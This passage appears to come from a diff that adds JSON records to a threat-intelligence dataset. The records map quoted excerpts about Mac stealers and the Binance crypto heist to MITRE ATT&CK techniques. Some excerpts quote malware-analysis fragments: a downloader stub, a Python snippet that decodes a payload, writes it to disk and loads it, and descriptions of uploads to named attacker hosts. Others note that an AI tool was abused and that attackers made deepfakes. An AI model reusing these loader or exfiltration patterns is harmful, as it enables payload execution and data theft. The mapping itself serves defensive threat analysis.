+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1090.003",
+        "name": "Proxy: Multi-hop Proxy",
+        "parent_id": "T1090",
+        "url": "https://attack.mitre.org/techniques/T1090/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“It somewhat novelly employs a Dead Drop Resolver (DDR) technique, while also providing reverse shell capabilities.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1102.001",
+        "name": "Web Service: Dead Drop Resolver",
+        "parent_id": "T1102",
+        "url": "https://attack.mitre.org/techniques/T1102/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Finally, the response from the web request is used with the vm.runInContext() method to compile and run the subsequent stage.\" - Phorion The second stage is a simple downloader that retrieves and executes Paradox: function downloadAndRun() { var url =…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“[task launch]; NSData* data = [[handle readDataToEndOfFile] retain]; [task waitUntilExit]; id location_2 = [[clsRef_NSString alloc] initWithData:data encoding:4]; ... [location scanUpToString:@\"Serial Number (system): \" intoString:0]; [location scanString:@\"Serial Number…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1132",
+        "name": "Data Encoding",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1132"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“This data is then sent to the C2 domain [function.undefined21.com].” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1132.001",
+        "name": "Data Encoding: Standard Encoding",
+        "parent_id": "T1132",
+        "url": "https://attack.mitre.org/techniques/T1132/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Dynamic library download and load (ret=1): body_path = os.path.join(directory, \"init.dll\") # or \"init\" on non-Windows with open(body_path, \"wb\") as f: binData = base64.b64decode(res[\"content\"]) f.write(binData) ctypes.cdll.LoadLibrary(body_path)” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1573.001",
+        "name": "Encrypted Channel: Symmetric Cryptography",
+        "parent_id": "T1573",
+        "url": "https://attack.mitre.org/techniques/T1573/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“As such, the Kitty sample analyzed here does not yet exfiltrate files to a remote attacker-controlled server, as the hardcoded endpoint remains set to localhost.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“The collected data is then zipped and uploaded via curl to https://goldenticketsshop.com/api/log.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1048.002",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+        "parent_id": "T1048",
+        "url": "https://attack.mitre.org/techniques/T1048/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- lldb The de facto command-line debugger for macOS, installed at /usr/bin/lldb as part of Xcode.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1048.003",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+        "parent_id": "T1048",
+        "url": "https://attack.mitre.org/techniques/T1048/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Kitty Stealer Kitty Stealer is (or was) a relatively simple stealer, narrowly focused on harvesting sensitive Chrome data and Exodus cryptocurrency wallets.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0050",
+      "confidence": "medium",
+      "description": "“In a post on X, Binance said its initial investigation showed that the hackers broke into the company’s network after targeting a “compromised” Binance engineer’s laptop, which “allowed an attacker to gain access to a service container and submit unauthorized withdrawal…” — TechCrunch security",
+      "provenance": {
+        "article_source": "TechCrunch security",
+        "article_url": "https://techcrunch.com/2026/10/30/north-korean-hackers-blamed-for-stealing-record-6-3b-in-binance-breach/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "TechCrunch security: North Korean hackers blamed for stealing record $6.3B in Binance breach",
+          "url": "https://techcrunch.com/2026/10/30/north-korean-hackers-blamed-for-stealing-record-6-3b-in-binance-breach/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.004",
+        "name": "Unsecured Credentials: Private Keys",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0050",
+      "confidence": "medium",
+      "description": "“Elliptic said some of the stolen funds ended up in the same wallet that was used in a previous cyberattack on crypto exchange Bitget earlier this year, in which hackers stole $351 million.” — TechCrunch security",
+      "provenance": {
+        "article_source": "TechCrunch security",
+        "article_url": "https://techcrunch.com/2026/10/30/north-korean-hackers-blamed-for-stealing-record-6-3b-in-binance-breach/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "TechCrunch security: North Korean hackers blamed for stealing record $6.3B in Binance breach",
+          "url": "https://techcrunch.com/2026/10/30/north-korean-hackers-blamed-for-stealing-record-6-3b-in-binance-breach/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0052",
+      "confidence": "medium",
+      "description": "“According to TRM, the Ethereum activity initially looked like the result of phishing.” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/6-billion-binance-hack-bears-hallmarks-of-north-koreas-tradertraitor/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: $6 Billion Binance Hack Bears Hallmarks of North Korea’s TraderTraitor",
+          "url": "https://www.securityweek.com/6-billion-binance-hack-bears-hallmarks-of-north-koreas-tradertraitor/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566",
+        "name": "Phishing",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1566"
+      }
+    },
+    {
+      "attack_ref": "INC-0052",
+      "confidence": "medium",
+      "description": "“Related: $86 Million Crypto Heist Linked to Ledger Signer Hardware Implant Related: Crypto Scammers Hijack Microsoft’s Official X Account Related: North Korea Suspected in $351 Million Bitget Crypto Heist” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/6-billion-binance-hack-bears-hallmarks-of-north-koreas-tradertraitor/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: $6 Billion Binance Hack Bears Hallmarks of North Korea’s TraderTraitor",
+          "url": "https://www.securityweek.com/6-billion-binance-hack-bears-hallmarks-of-north-koreas-tradertraitor/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0047",
+      "confidence": "medium",
+      "description": "“It's one thing, he says, for an attacker to gain initial access.” — Dark Reading",
+      "provenance": {
+        "article_source": "Dark Reading",
+        "article_url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Dark Reading: One Compromised Laptop, Billions Lost: The Binance Attack-Path Warning",
+          "url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566",
+        "name": "Phishing",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1566"
+      }
+    },
+    {
+      "attack_ref": "INC-0047",
+      "confidence": "high",
+      "description": "“That means segregation of duties, management of private keys that authorize transfers, limits on the size of a transfer, MFA on the use of the private key monitoring, alerting for large transfers, and endpoint detection on all employee devices, Bruggeman says.” — Dark Reading",
+      "provenance": {
+        "article_source": "Dark Reading",
+        "article_url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Dark Reading: One Compromised Laptop, Billions Lost: The Binance Attack-Path Warning",
+          "url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.004",
+        "name": "Unsecured Credentials: Private Keys",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0047",
+      "confidence": "medium",
+      "description": "“And in around 20 minutes, the threat actors drained billions of dollars in assets.” — Dark Reading",
+      "provenance": {
+        "article_source": "Dark Reading",
+        "article_url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Dark Reading: One Compromised Laptop, Billions Lost: The Binance Attack-Path Warning",
+          "url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0051",
+      "confidence": "medium",
+      "description": "“Related: $2 Million+ Drained From Polymarket Traders in New Supply Chain Attack Related: Hackers Return $263 Million Stolen From Liquid Network” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/fbi-flags-over-600-addresses-tied-to-north-koreas-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist",
+          "url": "https://www.securityweek.com/fbi-flags-over-600-addresses-tied-to-north-koreas-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "parent_id": "T1195",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0051",
+      "confidence": "medium",
+      "description": "“The FBI has formally blamed North Korean state-sponsored hackers for the record-breaking Binance cryptocurrency heist and is asking the crypto industry to help stop the stolen funds from being laundered.” — SecurityWeek cybercrime",
+      "provenance": {
+        "article_source": "SecurityWeek cybercrime",
+        "article_url": "https://www.securityweek.com/fbi-flags-over-600-addresses-tied-to-north-koreas-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist",
+          "url": "https://www.securityweek.com/fbi-flags-over-600-addresses-tied-to-north-koreas-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "low",
+      "description": "“During the first interview, the HR impostor shared a social media account containing personal photos and videos to build rapport.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1593.001",
+        "name": "Search Open Websites/Domains: Social Media",
+        "parent_id": "T1593",
+        "url": "https://attack.mitre.org/techniques/T1593/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "medium",
+      "description": "“How the attack unfolded According to Binance, the intrusion unfolded in stages and relied on fake recruiters, malicious downloads, hijacked employee computers and an internal AI tool. “It was not a single isolated breach or a simple phishing incident,” the company noted.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1585.001",
+        "name": "Establish Accounts: Social Media Accounts",
+        "parent_id": "T1585",
+        "url": "https://attack.mitre.org/techniques/T1585/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "medium",
+      "description": "“How the attack unfolded According to Binance, the intrusion unfolded in stages and relied on fake recruiters, malicious downloads, hijacked employee computers and an internal AI tool. “It was not a single isolated breach or a simple phishing incident,” the company noted.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566",
+        "name": "Phishing",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1566"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "medium",
+      "description": "“Binance says the hackers behind last week’s $6.34 billion theft reached its wallet signing systems after a months-long campaign that compromised three engineers’ computers, one of them through a fake job interview.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "low",
+      "description": "“On October 29, the attackers signed into the third engineer’s computer, deployed a container with credentials taken from the first engineer and kicked off the attack with a malicious script.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1610",
+        "name": "Deploy Container",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1610"
+      }
+    },
+    {
+      "attack_ref": "INC-0025",
+      "confidence": "medium",
+      "description": "“Other developments North Korea has rejected the FBI’s attribution of the heist to its TraderTraitor hackers. “It is a grave political provocation against the DPRK that the US misleads international public opinion as if all the cyber crimes in different parts of the world are…” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0358",
+      "confidence": "medium",
+      "description": "“In some instances, the hackers used AI to create deepfake videos of prominent cryptocurrency figures.” — The Record",
+      "provenance": {
+        "article_source": "The Record",
+        "article_url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1683.002",
+        "name": "Generate Content: Audio-Visual Content",
+        "parent_id": "T1683",
+        "url": "https://attack.mitre.org/techniques/T1683/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0358",
+      "confidence": "high",
